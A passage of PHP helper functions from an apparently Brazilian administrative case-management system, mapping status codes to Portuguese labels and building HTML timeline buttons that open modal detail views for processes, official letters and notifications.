				."pmodalHtml('<i class=icon-tag></i> DETALHES DE SERVIÇO Nº ".$timeline_id." DO PROCESSO','ajax/faisher.php','get','faisher=7_pro_protocolos&formVisualizaPincipal=".$form."&ajax=servicoVer&id_a=".$id_a."&cont=".$timeline_id."');"
				.'"><i class="icon-external-link"></i> ADICIONADO SERVIÇO Nº '.$timeline_id.'</button></div></div>';
			}else{
				$leg = '<div class="tlBdetalhe">Foi desencubado o processo que estava anteriormente encubado.</div>';
			}
		}
	}//if($timeline == "desencubar"){
	if($timeline == "finalizar"){//.........................................................................................
		if($tipo == "pdf"){
			$leg = '<div class="tlBdetalhe">Processo finalizado/arquivado com o status:<div class="destaque">'.legProtocoloStatus($timeline_id).'</div></div>';
		}else{
			$leg = '<div class="tlBdetalhe">Processo finalizado/arquivado com o status:
                <div class="destaque"><button type="button" class="btn" rel="tooltip" data-original-title="Foi finalizado"><i class="icon-info-sign"></i> '.legProtocoloStatus($timeline_id).'</button></div></div>';
		}
	}//if($timeline == "finalizar"){
	if($timeline == "reativar"){//............................................................................................
		$leg = '<div class="tlBdetalhe">Processo foi reativado/desarquivado foi colocado em execução.</div>';
	}//if($timeline == "reativar"){
	return $leg;
}//detalhesProtocoloEventos
/* INFORMAÇÕES DE PARÂMETROS **************************************
EVENTOS - timeline
finalizar - (status)
reativar - ()
***************************************************************/







//monta botão de detalhes de evento protocolos
function btDetalhesProtocoloEventos($timeline,$timeline_id,$id_a="",$form=""){
	$leg = "";
	if($timeline == "sms"){//........................................................................................
		$leg = '<button type="button" class="btn" rel="tooltip" data-placement="left" data-original-title="Número do Celular"><i class="icon-phone"></i> '.formadaTelBR($timeline_id).'</button>';
	}//if($timeline == "sms"){
	if($timeline == "sms_acao"){//........................................................................................
		$leg = '<button type="button" class="btn" rel="tooltip" data-placement="left" data-original-title="Ação tomada">'.legAcaoTorpedos($timeline_id).'</button>';
	}//if($timeline == "sms_acao"){
	if($timeline == "tramite"){//........................................................................................
		$leg = '<button type="button" class="btn btn-primary" rel="tooltip" data-original-title="Ver descrição do evento" onclick="'
				."pmodalHtml('<i class=icon-external-link></i> DETALHES DA GUIA DE TRAMITAÇÃO','ajax/faisher.php','get','faisher=7_pro_protocolotramita&tab_id=1&ajax=visualizar&id_a=".$timeline_id."&FULLVIEW=".$FULL."&POP=1');"
				.'"><i class="icon-external-link"></i> Nº '.$timeline_id.'</button>';
	}//if($timeline == "tramite"){
	if($timeline == "tra_recebido"){//........................................................................................
		$d["0"] = date('Ymd'); $d["1"] = $d["0"]; $FULL = fGERAL::cryptoSys(fGERAL::jsonArray($d,"enc"));
		$leg = '<button type="button" class="btn btn-primary" rel="tooltip" data-placement="left" data-original-title="Ver descrição do evento" onclick="'
				."pmodalHtml('<i class=icon-external-link></i> DETALHES DA GUIA DE TRAMITAÇÃO','ajax/faisher.php','get','faisher=7_pro_protocolotramita&tab_id=1&ajax=visualizar&id_a=".$timeline_id."&FULLVIEW=".$FULL."&POP=1');"
				.'"><i class="icon-external-link"></i> Nº '.$timeline_id.'</button>';
	}//if($timeline == "tra_recebido"){
	if($timeline == "tra_cancelado"){//........................................................................................
		$d["0"] = date('Ymd'); $d["1"] = $d["0"]; $FULL = fGERAL::cryptoSys(fGERAL::jsonArray($d,"enc"));
		$leg = '<button type="button" class="btn btn-primary" rel="tooltip" data-placement="left" data-original-title="Ver descrição do evento" onclick="'
				."pmodalHtml('<i class=icon-external-link></i> DETALHES DA GUIA DE TRAMITAÇÃO','ajax/faisher.php','get','faisher=7_pro_protocolotramita&tab_id=1&ajax=visualizar&id_a=".$timeline_id."&FULLVIEW=".$FULL."&POP=1');"
				.'"><i class="icon-external-link"></i> Nº '.$timeline_id.'</button>';
	}//if($timeline == "tra_cancelado"){
	if($timeline == "arquivo"){//..............................................................................................
		if($timeline_id != ""){
			$leg = '<button type="button" class="btn btn-primary" rel="tooltip" data-placement="left" data-original-title="Ver descrição do evento" onclick="'
					."pmodalHtml('<i class=icon-tag></i> DETALHES DO TRÂMITE DE ARQUIVO Nº ".$timeline_id."','ajax/faisher.php','get','faisher=7_pro_protocolos&formVisualizaPincipal=".$form."&ajax=arquivoVer&id_a=".$id_a."&ver=".$timeline_id."');"
					.'"><i class="icon-external-link"></i> ARQUIVO Nº '.$timeline_id.'</button>';
		}
	}//if($timeline == "arquivo"){
	if($timeline == "arquivo_scanner"){//.......................................................................................
		if($timeline_id != ""){
			$leg = '<button type="button" class="btn btn-primary" rel="tooltip" data-placement="left" data-original-title="Ver descrição do evento" onclick="'
				."pmodalHtml('<i class=icon-tag></i> DETALHES DO TRÂMITE DE ARQUIVO Nº ".$timeline_id."','ajax/faisher.php','get','faisher=7_pro_protocolos&formVisualizaPincipal=".$form."&ajax=arquivoVer&id_a=".$id_a."&ver=".$timeline_id."');"
				.'"><i class="icon-external-link"></i> ARQUIVO Nº '.$timeline_id.'</button>';
		}
	}//if($timeline == "arquivo_scanner"){
	if($timeline == "publicacao"){//............................................................................................
		if($timeline_id != ""){ $d = explode("-",$timeline_id);
			$leg = '<button type="button" class="btn btn-primary" rel="tooltip" data-placement="left" data-original-title="Ver descrição do evento" onclick="'
				."pmodalHtml('<i class=icon-tag></i> DETALHES DA PUBLICAÇÃO Nº ".$d["0"]."','ajax/faisher.php','get','faisher=7_pro_protocolos&formVisualizaPincipal=".$form."&ajax=publicaVer&id_a=".$id_a."&ver=".$d["1"]."');"
				.'"><i class="icon-external-link"></i> PUBLICAÇÃO Nº '.$d["0"].'</button>';
		}
	}//if($timeline == "publicacao"){
	if($timeline == "duam"){//..................................................................................................
		if($timeline_id != ""){
			$leg = '<a class="btn btn-primary" rel="tooltip" data-placement="left" data-original-title="Abrir emissão de GR" href="'.SYS_URLRAIZ.'duam/?rm='.fGERAL::limpaCode($timeline_id).'" target="_blank"><i class="icon-external-link"></i> '.SYS_CONFIG_RM_SIGLA.' '.fGERAL::legCodeDuam($timeline_id).'</a>';
		}
	}//if($timeline == "duam"){
	if($timeline == "servico"){//................................................................................................
		if($timeline_id != ""){
			$leg = '<button type="button" class="btn btn-primary" rel="tooltip" data-placement="left" data-original-title="Ver descrição do serviço" onclick="'
				."pmodalHtml('<i class=icon-tag></i> DETALHES DE SERVIÇO Nº ".$timeline_id." DO PROCESSO','ajax/faisher.php','get','faisher=7_pro_protocolos&formVisualizaPincipal=".$form."&ajax=servicoVer&id_a=".$id_a."&cont=".$timeline_id."');"
				.'"><i class="icon-external-link"></i> VER SERVIÇO Nº '.$timeline_id.'</button>';
		}
	}//if($timeline == "servico"){
	if($timeline == "servico_acao"){//...........................................................................................
		if($timeline_id != ""){
			$leg = '<button type="button" class="btn btn-primary" rel="tooltip" data-placement="left" data-original-title="Ver descrição do serviço" onclick="'
				."pmodalHtml('<i class=icon-tag></i> DETALHES DE SERVIÇO Nº ".$timeline_id." DO PROCESSO','ajax/faisher.php','get','faisher=7_pro_protocolos&formVisualizaPincipal=".$form."&ajax=servicoVer&id_a=".$id_a."&cont=".$timeline_id."');"
				.'"><i class="icon-external-link"></i> VER SERVIÇO Nº '.$timeline_id.'</button>';
		}
	}//if($timeline == "servico_acao"){
	if($timeline == "notificacao"){//........................................................................................
		$d["0"] = date('Ymd'); $d["1"] = $d["0"]; $FULL = fGERAL::cryptoSys(fGERAL::jsonArray($d,"enc"));
		$leg = '<button type="button" class="btn btn-primary" rel="tooltip" data-placement="left" data-original-title="Ver descrição da notificação" onclick="'
				."pmodalHtml('<i class=icon-external-link></i> DETALHES DA NOTIFICAÇÃO','ajax/faisher.php','get','faisher=9_not_notificacao&ajax=visualizar&id_a=".$timeline_id."&FULLVIEW=".$FULL."&POP=1');"
				.'"><i class="icon-external-link"></i> '.SYS_CONFIG_RM_SIGLA.' '.fGERAL::legCode9($timeline_id).'</button>';
	}//if($timeline == "notificacao"){
	if($timeline == "apensado"){//........................................................................................
		$d["0"] = date('Ymd'); $d["1"] = $d["0"]; $FULL = fGERAL::cryptoSys(fGERAL::jsonArray($d,"enc"));
		$leg = '<button type="button" class="btn btn-primary" rel="tooltip" data-placement="left" data-original-title="Ver esse processo" onclick="'
				."pmodalHtml('<i class=icon-external-link></i> DETALHES DO PROCESSO APENSADO','ajax/faisher.php','get','faisher=7_pro_protocolos&ajax=visualizar&id_a=".fGERAL::limpaCode($timeline_id)."&FULLVIEW=".$FULL."&POP=1');"
				.'"><i class="icon-external-link"></i> '.SYS_CONFIG_RM_SIGLA.' '.fGERAL::legCode7($timeline_id).'</button>';
	}//if($timeline == "apensado"){
	if($timeline == "desencubar"){//.........................................................................................
		if(($timeline_id != "") and ($timeline_id >= "1")){
			$leg = '<button type="button" class="btn btn-primary" rel="tooltip" data-placement="left" data-original-title="Ver descrição do serviço" onclick="'
				."pmodalHtml('<i class=icon-tag></i> DETALHES DE SERVIÇO Nº ".$timeline_id." DO PROCESSO','ajax/faisher.php','get','faisher=7_pro_protocolos&formVisualizaPincipal=".$form."&ajax=servicoVer&id_a=".$id_a."&cont=".$timeline_id."');"
				.'"><i class="icon-external-link"></i> ADICIONADO SERVIÇO Nº '.$timeline_id.'</button>';
		}
	}//if($timeline == "desencubar"){
	return $leg;
}//btDetalhesProtocoloEventos
/* INFORMAÇÕES DE PARÂMETROS **************************************
EVENTOS - timeline
***************************************************************/










//monta legenda de status das tabelas de ofícios - legenda ofícios
function legOficioStatus($var,$divisor=" "){
	$leg = "Indefinido";	
	if($var == "0"){ $leg = "CANCELADO"; }//ARQUIVADO
	if($var == "1"){ $leg = "ATIVO"; }//EXECUTANDO - ENCUBADO
	if($var == "2"){ $leg = "FINALIZADO"; }//ARQUIVADO
	if($var == "3"){ $leg = "APENSADO"; }//ACOMPANHA O PAI
	if($var == "4"){ $leg = "EM".$divisor."TRAMITAÇÃO".$divisor."(AGUARDANDO".$divisor."RECEBIMENTO)"; }//EXECUTANDO
	if($var == "5"){ $leg = "AGUARDANDO".$divisor."PAGAMENTO"; }//EXECUTANDO - ENCUBADO
	if($var == "6"){ $leg = "AGUARDANDO".$divisor."INTERAÇÃO".$divisor."DO".$divisor."CANDIDATO"; }//EXECUTANDO - ENCUBADO
	if($var == "7"){ $leg = "EMITINDO".$divisor."DOCUMENTO".$divisor."DED"; }//EXECUTANDO - ENCUBADO
	if($var == "8"){ $leg = "DEFERIDO/ACEITO"; }//ARQUIVADO
	if($var == "9"){ $leg = "INDEFERIDO/NEGADO"; }//ARQUIVADO
	if($var == "10"){ $leg = "RETIRADO".$divisor."EM".$divisor."MULTI-GESTÃO"; }//ARQUIVADO
	if($var == "14"){ $leg = "EM".$divisor."TRAMITAÇÃO".$divisor."MULTI-GESTÃO".$divisor."(AGUARDANDO".$divisor."RECEBIMENTO)"; }//EXECUTANDO
	return $leg;
}//legOficioStatus









//monta legenda de tipos de descritivo do ofício
function legOficioDescritivoTipo($var){
	$leg = "Indefinido";	
	if($var == "1"){ $leg = "COMUNICAÇÃO"; }
	if($var == "2"){ $leg = "REQUERIMENTO"; }
	if($var == "3"){ $leg = "COMUNICADO DE LEITURA"; }
	return $leg;
}//legOficioDescritivoTipo






//monta legenda de tipo de publicaÇÃO realizada no ofício
function legOficioPublicacaoTipo($var){
	$ret = $var;
	$arr["1"] = "Análise de Ofício";
	$arr["2"] = "Decisão";
	$arr["3"] = "Despacho";
	$arr["4"] = "Parecer";
	$arr["5"] = "SMS";
	$arr["6"] = "E-mail";
	if($ret != "array"){ if(isset($arr["$ret"])){ $leg = $arr["$ret"]; }else{ $leg = "Indefinido"; } }else{ $leg = $arr; }
	return $leg;
}//legOficioPublicacaoTipo






//monta legenda de status das tabelas de arquivos - legenda arquivos de ofícios
function legOficioArquivoStatus($var){
	$leg = "Indefinido";	
	if($var == "0"){ $leg = "REMOVIDO/CANCELADO"; }
	if($var == "1"){ $leg = "ATIVO/EM USO"; }
	return $leg;
}//legOficioArquivoStatus





//monta legenda de controle de publicaÇÃO realizada no ofício
function legOficioPublicacaoControle($var){
	$ret = $var;
	$arr["1"] = "Público";
	$arr["2"] = "Privado";
	$arr["3"] = "Rascunho";
	if($ret != "array"){ if(isset($arr["$ret"])){ $leg = $arr["$ret"]; }else{ $leg = "Indefinido"; } }else{ $leg = $arr; }
	return $leg;
}//legOficioPublicacaoControle






//monta legenda de status das tabelas de descritivos de ofícios
function legOficioStatusDescritivo($var){
	$leg = "Indefinido";	
	if($var == "0"){ $leg = "CANCELADO"; }
	if($var == "1"){ $leg = "ATIVO"; }
	if($var == "2"){ $leg = "NÃO RESPONDIDO"; }
	if($var == "3"){ $leg = "EM RESPOSTAS"; }
	if($var == "4"){ $leg = "FINALIZADO"; }
	//descritivo leitura
	if($var == "5"){ $leg = "ENVIANDO P/LEITURA"; }
	if($var == "6"){ $leg = "EM LEITURA"; }
	if($var == "7"){ $leg = "LEITURA FINALIZADA"; }
	return $leg;
}//legOficioStatusDescritivo





//monta legenda de situação ofícios
function legOficioSituacao($var){
	$leg = "Indefinido";	
	if($var == "1"){ $leg = "EM EXECUÇÃO"; }
	if($var == "2"){ $leg = "ENCUBADO"; }
	if($var == "3"){ $leg = "ARQUIVADO"; }
	return $leg;
}//legOficioSituacao






//monta detalhes de evento ofícios
function detalhesOficioEventos($timeline,$timeline_id,$tipo="",$id_a="",$form="",$detalhes=""){
	$leg = "";
	if($timeline == "criado"){//.....................................................................................
		$leg = '<div class="tlBdetalhe">Aqui foi quando o ofício foi criado/solicitado.</div>';
	}//if($timeline == "criado"){
	if($timeline == "tramite"){//........................................................................................
		if($tipo == "pdf"){
			$leg = '<div class="tlBdetalhe">Número da Guia de tramitação:<div class="destaque">Nº '.$timeline_id.'</div></div>';
		}else{
			$d["0"] = date('Ymd'); $d["1"] = $d["0"]; $FULL = fGERAL::cryptoSys(fGERAL::jsonArray($d,"enc"));
			$leg = '<div class="tlBdetalhe">Número da Guia de tramitação (detalhes):
                <div class="destaque"><button type="button" class="btn btn-primary" rel="tooltip" data-original-title="Ver descrição do evento" onclick="'
				."pmodalHtml('<i class=icon-external-link></i> DETALHES DA GUIA DE TRAMITAÇÃO','ajax/faisher.php','get','faisher=8_ofi_oficiotramita&tab_id=1&ajax=visualizar&id_a=".$timeline_id."&FULLVIEW=".$FULL."&POP=1');"
				.'"><i class="icon-external-link"></i> Nº '.$timeline_id.'</button></div></div>';
		}
	}//if($timeline == "tramite"){
	if($timeline == "tra_recebido"){//........................................................................................
		if($tipo == "pdf"){
			$leg = '<div class="tlBdetalhe">Guia de tramitação recebida com o ofício:<div class="destaque">Nº '.$timeline_id.'</div></div>';
		}else{
			$d["0"] = date('Ymd'); $d["1"] = $d["0"]; $FULL = fGERAL::cryptoSys(fGERAL::jsonArray($d,"enc"));
			$leg = '<div class="tlBdetalhe">Guia de tramitação recebida com o ofício (detalhes):
                <div class="destaque"><button type="button" class="btn btn-primary" rel="tooltip" data-original-title="Ver descrição do evento" onclick="'
				."pmodalHtml('<i class=icon-external-link></i> DETALHES DA GUIA DE TRAMITAÇÃO','ajax/faisher.php','get','faisher=8_ofi_oficiotramita&tab_id=1&ajax=visualizar&id_a=".$timeline_id."&FULLVIEW=".$FULL."&POP=1');"
				.'"><i class="icon-external-link"></i> Nº '.$timeline_id.'</button></div></div>';
		}
	}//if($timeline == "tra_recebido"){
	if($timeline == "tra_cancelado"){//........................................................................................
		if($tipo == "pdf"){
			$leg = '<div class="tlBdetalhe">Guia de tramitação cancelada, o ofício não saiu do depto: <div class="destaque">Nº '.$timeline_id.'</div></div>';
		}else{
			$d["0"] = date('Ymd'); $d["1"] = $d["0"]; $FULL = fGERAL::cryptoSys(fGERAL::jsonArray($d,"enc"));
			$leg = '<div class="tlBdetalhe">Guia de tramitação cancelada, o ofício não saiu do depto (detalhes):
                <div class="destaque"><button type="button" class="btn btn-primary" rel="tooltip" data-original-title="Ver descrição do evento" onclick="'
				."pmodalHtml('<i class=icon-external-link></i> DETALHES DA GUIA DE TRAMITAÇÃO','ajax/faisher.php','get','faisher=8_ofi_oficiotramita&tab_id=1&ajax=visualizar&id_a=".$timeline_id."&FULLVIEW=".$FULL."&POP=1');"
				.'"><i class="icon-external-link"></i> Nº '.$timeline_id.'</button></div></div>';
		}
	}//if($timeline == "tra_cancelado"){
	if($timeline == "arquivo"){//..............................................................................................
		if($timeline_id != ""){
		if($tipo == "pdf"){
			$leg = '<div class="tlBdetalhe">Foi enviado ao ofício o arquivo: <div class="destaque">TRÂMITE DE ARQUIVO Nº '.$timeline_id.'</div></div>';
		}else{
			if(preg_match("/removido\/cancelado/i",$detalhes)){
				$leg = '<div class="tlBdetalhe">Foi enviado ao ofício o arquivo (detalhes):
                <div class="destaque"><button type="button" class="btn" rel="tooltip" data-original-title="Sem detalhes adicionais"><i class="icon-info-sign"></i> Nº '.$timeline_id.'</button></div></div>';
			}else{
				$leg = '<div class="tlBdetalhe">Foi enviado ao ofício o arquivo (detalhes):
                <div class="destaque"><button type="button" class="btn btn-primary" rel="tooltip" data-original-title="Ver descrição do evento" onclick="'
					."pmodalHtml('<i class=icon-tag></i> DETALHES DO TRÂMITE DE ARQUIVO Nº ".$timeline_id."','ajax/faisher.php','get','faisher=8_ofi_oficios&formVisualizaPincipal=".$form."&ajax=arquivoVer&id_a=".$id_a."&ver=".$timeline_id."');"
					.'"><i class="icon-external-link"></i> ARQUIVO Nº '.$timeline_id.'</button></div></div>';
			}
		} }
	}//if($timeline == "arquivo"){
	if($timeline == "arquivo_scanner"){//.......................................................................................
		if($timeline_id != ""){
		if($tipo == "pdf"){
			$leg = '<div class="tlBdetalhe">Foi solicitado um scanner de arquivo no ofício: <div class="destaque">TRÂMITE DE ARQUIVO Nº '.$timeline_id.'</div></div>';
		}else{
			$leg = '<div class="tlBdetalhe">Foi solicitado um scanner de arquivo no ofício (detalhes):
                <div class="destaque"><button type="button" class="btn btn-primary" rel="tooltip" data-original-title="Ver descrição do evento" onclick="'
				."pmodalHtml('<i class=icon-tag></i> DETALHES DO TRÂMITE DE ARQUIVO Nº ".$timeline_id."','ajax/faisher.php','get','faisher=8_ofi_oficios&formVisualizaPincipal=".$form."&ajax=arquivoVer&id_a=".$id_a."&ver=".$timeline_id."');"
				.'"><i class="icon-external-link"></i> ARQUIVO Nº '.$timeline_id.'</button></div></div>';
		} }
	}//if($timeline == "arquivo_scanner"){
	if($timeline == "publicacao"){//............................................................................................
		if($timeline_id != ""){ $d = explode("-",$timeline_id);
		if($tipo == "pdf"){
			$leg = '<div class="tlBdetalhe">Foi adicionado uma publicação ao ofício: <div class="destaque">PUBLICAÇÃO Nº '.$d["0"].'</div></div>';
		}else{
			$leg = '<div class="tlBdetalhe">Foi adicionado uma publicação ao ofício (detalhes):
                <div class="destaque"><button type="button" class="btn btn-primary" rel="tooltip" data-original-title="Ver descrição do evento" onclick="'
				."pmodalHtml('<i class=icon-tag></i> DETALHES DA PUBLICAÇÃO Nº ".$d["0"]."','ajax/faisher.php','get','faisher=8_ofi_oficios&formVisualizaPincipal=".$form."&ajax=publicaVer&id_a=".$id_a."&ver=".$d["1"]."');"
				.'"><i class="icon-external-link"></i> PUBLICAÇÃO Nº '.$d["0"].'</button></div></div>';
		} }
	}//if($timeline == "publicacao"){
	if($timeline == "ajustedepto"){//..........................................................................................
		if($timeline_id != ""){
		if($tipo == "pdf"){
			$leg = '<div class="tlBdetalhe">Foi realizado uma ação automática no ofício: <div class="destaque">AJUSTE/SISTEMA</div></div>';
		}else{
			$leg = '<div class="tlBdetalhe">Foi realizado uma ação automática no ofício:
                <div class="destaque"><button type="button" class="btn" rel="tooltip" data-original-title="Automático"><i class="icon-info-sign"></i> AJUSTE/SISTEMA</button></div></div>';
		} }
	}//if($timeline == "ajustedepto"){
	if($timeline == "resp"){//............................................................................................
		$leg = '<div class="tlBdetalhe">Ação com o responsável pela execução do ofício.</div>';
	}//if($timeline == "resp"){
	if($timeline == "apensado"){//........................................................................................
		if($tipo == "pdf"){
			$leg = '<div class="tlBdetalhe">Número '.SYS_CONFIG_RM_SIGLA.' do ofício apensado a esse:<div class="destaque">'.SYS_CONFIG_RM_SIGLA.' '.fGERAL::legCode7($timeline_id).'</div></div>';
		}else{
			$d["0"] = date('Ymd'); $d["1"] = $d["0"]; $FULL = fGERAL::cryptoSys(fGERAL::jsonArray($d,"enc"));
			$leg = '<div class="tlBdetalhe">Número '.SYS_CONFIG_RM_SIGLA.' do ofício apensado a esse (detalhes):
                <div class="destaque"><button type="button" class="btn btn-primary" rel="tooltip" data-original-title="Ver esse ofício" onclick="'
				."pmodalHtml('<i class=icon-external-link></i> DETALHES DO OFÍCIO APENSADO','ajax/faisher.php','get','faisher=8_ofi_oficios&ajax=visualizar&id_a=".fGERAL::limpaCode($timeline_id)."&FULLVIEW=".$FULL."&POP=1');"
				.'"><i class="icon-external-link"></i> '.SYS_CONFIG_RM_SIGLA.' '.fGERAL::legCode7($timeline_id).'</button></div></div>';
		}
	}//if($timeline == "apensado"){
	if($timeline == "encubar"){//.........................................................................................
		if($tipo == "pdf"){
			$leg = '<div class="tlBdetalhe">Devido não haver qualquer interação no ofício:<div class="destaque">DEPOIS DE '.$timeline_id.' DIAS</div></div>';
		}else{
			$leg = '<div class="tlBdetalhe">Devido não haver qualquer interação no ofício:
                <div class="destaque"><button type="button" class="btn" rel="tooltip" data-original-title="Foi ENCUBADO"><i class="icon-folder-close"></i> DEPOIS DE <b>'.$timeline_id.'</b> DIAS</button></div></div>';
		}
	}//if($timeline == "encubar"){
	if($timeline == "desencubar"){//.........................................................................................
		if($tipo == "pdf"){
			$leg = '<div class="tlBdetalhe">Foi desencubado o ofício que estava anteriormente encubado <div class="destaque">'.$leg_a.'</div></div>';
		}else{
			$leg = '<div class="tlBdetalhe">Foi desencubado o ofício que estava anteriormente encubado.</div>';
		}
	}//if($timeline == "desencubar"){
	if($timeline == "finalizar"){//.........................................................................................
		if($tipo == "pdf"){
			$leg = '<div class="tlBdetalhe">Processo finalizado/arquivado com o status:<div class="destaque">'.legOficioStatus($timeline_id).'</div></div>';
		}else{
			$leg = '<div class="tlBdetalhe">Processo finalizado/arquivado com o status:
                <div class="destaque"><button type="button" class="btn" rel="tooltip" data-original-title="Foi finalizado"><i class="icon-info-sign"></i> '.legOficioStatus($timeline_id).'</button></div></div>';
		}
	}//if($timeline == "finalizar"){
	if($timeline == "reativar"){//............................................................................................
		$leg = '<div class="tlBdetalhe">Ofício foi reativado/desarquivado foi colocado em execução.</div>';
	}//if($timeline == "reativar"){
	return $leg;
}//detalhesOficioEventos
/* INFORMAÇÕES DE PARÂMETROS **************************************
EVENTOS - timeline
finalizar - (status)
reativar - ()
***************************************************************/







//monta botão de detalhes de evento ofício
function btDetalhesOficioEventos($timeline,$timeline_id,$id_a="",$form=""){
	$leg = "";
	if($timeline == "tramite"){//........................................................................................
		$leg = '<button type="button" class="btn btn-primary" rel="tooltip" data-original-title="Ver descrição do evento" onclick="'
				."pmodalHtml('<i class=icon-external-link></i> DETALHES DA GUIA DE TRAMITAÇÃO','ajax/faisher.php','get','faisher=8_ofi_oficiotramita&tab_id=1&ajax=visualizar&id_a=".$timeline_id."&FULLVIEW=".$FULL."&POP=1');"
				.'"><i class="icon-external-link"></i> Nº '.$timeline_id.'</button>';
	}//if($timeline == "tramite"){
	if($timeline == "tra_recebido"){//........................................................................................
		$d["0"] = date('Ymd'); $d["1"] = $d["0"]; $FULL = fGERAL::cryptoSys(fGERAL::jsonArray($d,"enc"));
		$leg = '<button type="button" class="btn btn-primary" rel="tooltip" data-placement="left" data-original-title="Ver descrição do evento" onclick="'
				."pmodalHtml('<i class=icon-external-link></i> DETALHES DA GUIA DE TRAMITAÇÃO','ajax/faisher.php','get','faisher=8_ofi_oficiotramita&tab_id=1&ajax=visualizar&id_a=".$timeline_id."&FULLVIEW=".$FULL."&POP=1');"
				.'"><i class="icon-external-link"></i> Nº '.$timeline_id.'</button>';
	}//if($timeline == "tra_recebido"){
	if($timeline == "tra_cancelado"){//........................................................................................
		$d["0"] = date('Ymd'); $d["1"] = $d["0"]; $FULL = fGERAL::cryptoSys(fGERAL::jsonArray($d,"enc"));
		$leg = '<button type="button" class="btn btn-primary" rel="tooltip" data-placement="left" data-original-title="Ver descrição do evento" onclick="'
				."pmodalHtml('<i class=icon-external-link></i> DETALHES DA GUIA DE TRAMITAÇÃO','ajax/faisher.php','get','faisher=8_ofi_oficiotramita&tab_id=1&ajax=visualizar&id_a=".$timeline_id."&FULLVIEW=".$FULL."&POP=1');"
				.'"><i class="icon-external-link"></i> Nº '.$timeline_id.'</button>';
	}//if($timeline == "tra_cancelado"){
	if($timeline == "arquivo"){//..............................................................................................
		if($timeline_id != ""){
			$leg = '<button type="button" class="btn btn-primary" rel="tooltip" data-placement="left" data-original-title="Ver descrição do evento" onclick="'
					."pmodalHtml('<i class=icon-tag></i> DETALHES DO TRÂMITE DE ARQUIVO Nº ".$timeline_id."','ajax/faisher.php','get','faisher=8_ofi_oficios&formVisualizaPincipal=".$form."&ajax=arquivoVer&id_a=".$id_a."&ver=".$timeline_id."');"
					.'"><i class="icon-external-link"></i> ARQUIVO Nº '.$timeline_id.'</button>';
		}
	}//if($timeline == "arquivo"){
	if($timeline == "arquivo_scanner"){//.......................................................................................
		if($timeline_id != ""){
			$leg = '<button type="button" class="btn btn-primary" rel="tooltip" data-placement="left" data-original-title="Ver descrição do evento" onclick="'
				."pmodalHtml('<i class=icon-tag></i> DETALHES DO TRÂMITE DE ARQUIVO Nº ".$timeline_id."','ajax/faisher.php','get','faisher=8_ofi_oficios&formVisualizaPincipal=".$form."&ajax=arquivoVer&id_a=".$id_a."&ver=".$timeline_id."');"
				.'"><i class="icon-external-link"></i> ARQUIVO Nº '.$timeline_id.'</button>';
		}
	}//if($timeline == "arquivo_scanner"){
	if($timeline == "publicacao"){//............................................................................................
		if($timeline_id != ""){ $d = explode("-",$timeline_id);
			$leg = '<button type="button" class="btn btn-primary" rel="tooltip" data-placement="left" data-original-title="Ver descrição do evento" onclick="'
				."pmodalHtml('<i class=icon-tag></i> DETALHES DA PUBLICAÇÃO Nº ".$d["0"]."','ajax/faisher.php','get','faisher=8_ofi_oficios&formVisualizaPincipal=".$form."&ajax=publicaVer&id_a=".$id_a."&ver=".$d["1"]."');"
				.'"><i class="icon-external-link"></i> PUBLICAÇÃO Nº '.$d["0"].'</button>';
		}
	}//if($timeline == "publicacao"){
	if($timeline == "apensado"){//........................................................................................
		$d["0"] = date('Ymd'); $d["1"] = $d["0"]; $FULL = fGERAL::cryptoSys(fGERAL::jsonArray($d,"enc"));
		$leg = '<button type="button" class="btn btn-primary" rel="tooltip" data-placement="left" data-original-title="Ver esse processo" onclick="'
				."pmodalHtml('<i class=icon-external-link></i> DETALHES DO OFÍCIO APENSADO','ajax/faisher.php','get','faisher=8_ofi_oficios&ajax=visualizar&id_a=".fGERAL::limpaCode($timeline_id)."&FULLVIEW=".$FULL."&POP=1');"
				.'"><i class="icon-external-link"></i> '.SYS_CONFIG_RM_SIGLA.' '.fGERAL::legCode7($timeline_id).'</button>';
	}//if($timeline == "apensado"){
	return $leg;
}//btDetalhesOficioEventos
/* INFORMAÇÕES DE PARÂMETROS **************************************
EVENTOS - timeline
***************************************************************/




//monta legenda de status das tabelas remessa de ofícios - legenda remessa de envio de ofícios
function legOficioRemessaStatus($var){
	$leg = "Indefinido";	
	if($var == "0"){ $leg = "CANCELADO"; }
	if($var == "1"){ $leg = "EM TRAMITAÇÃO"; }
	if($var == "2"){ $leg = "RECEBIDO"; }
	return $leg;
}//legOficioRemessaStatus









//monta legenda de status das tabelas de notificações - legenda notificação
function legNotificacaoStatus($var,$divisor=" "){
	$leg = "Indefinido";	
	if($var == "0"){ $leg = "CANCELADA".$divisor."SEM".$divisor."PROCESSO"; }//ARQUIVADO
	if($var == "1"){ $leg = "ATIVA"; }//EXECUTANDO - ENCUBADO
	if($var == "2"){ $leg = "FINALIZADA"; }//ARQUIVADO
	if($var == "4"){ $leg = "EM".$divisor."TRAMITAÇÃO".$divisor."(AGUARDANDO".$divisor."RECEBIMENTO)"; }//EXECUTANDO
	if($var == "5"){ $leg = "AGUARDANDO".$divisor."PAGAMENTO"; }//EXECUTANDO - ENCUBADO
	if($var == "6"){ $leg = "AGUARDANDO".$divisor."INTERAÇÃO".$divisor."DO".$divisor."CANDIDATO"; }//EXECUTANDO - ENCUBADO
	if($var == "11"){ $leg = "FINALIZADO".$divisor."EMISSÃO".$divisor."CANCELADA"; }//ARQUIVADO
	if($var == "12"){ $leg = "FINALIZADO".$divisor."PAGAMENTO".$divisor."CANCELADO"; }//ARQUIVADO
	if($var == "15"){ $leg = "CANCELADO".$divisor."EM".$divisor."PROCESSO"; }//ARQUIVADO
	if($var == "19"){ $leg = "ERRO".$divisor."NO".$divisor."CÁLCULO"; }//EXECUTANDO - ENCUBADO
	return $leg;
}//legNotificacaoStatus






//monta legenda de situação notificações
function legNotificacaoSituacao($var){
	$leg = "Indefinido";	
	if($var == "1"){ $leg = "EM EXECUÇÃO"; }
	if($var == "2"){ $leg = "ENCUBADA"; }
	if($var == "3"){ $leg = "ARQUIVADA"; }
	return $leg;
}//legNotificacaoSituacao





//monta legenda de status das tabelas de arquivos - legenda arquivos de notificações
function legNotificacaoArquivoStatus($var){
	$leg = "Indefinido";	
	if($var == "0"){ $leg = "REMOVIDO/CANCELADO"; }
	if($var == "1"){ $leg = "AGUARDANDO APROVAÇÃO"; }
	if($var == "2"){ $leg = "SOLICITAÇÃO EM ABERTO"; }
	if($var == "3"){ $leg = "SOLICITAÇÃO FINALIZADA"; }
	if($var == "4"){ $leg = "REPROVADO"; }
	if($var == "5"){ $leg = "APROVADO"; }
	return $leg;
}//legNotificacaoArquivoStatus






//monta legenda de tipo de publicaÇÃO realizada na notificação
